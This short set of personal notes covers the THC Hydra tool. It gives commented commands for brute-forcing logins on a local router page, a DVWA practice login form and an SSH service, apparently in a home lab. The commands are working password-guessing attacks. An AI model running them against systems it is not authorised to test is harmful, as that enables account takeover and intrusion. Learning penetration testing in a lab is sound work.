// Chris's notes on using THC Hydra

# Cracking router login-page via hydra w/dictionary

# Login pop-up
hydra -l admin -P /dictionary.txt 192.168.1.1 http-get

# Login Page where
# http-post-form is type of request (seen in burpsuite)
# /dvwa/login.php is page address (ie: 192.168.1.1/dvwa/login.php)
# username is field name for username (seen in burpsuite and probably on page)
# ^USER^ tells hydra to put the username there
# same things with the password stuff
# Login tells hydra that this is for failed logins
# Login failed tells hydra that this is what those failed logins look like(burp)
hydra -l admin -p password 192.168.1.1 http-post-form 
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Cracking ssh login with hydra w/dictionary
hydra -l admin -p password 192.168.1.2 ssh
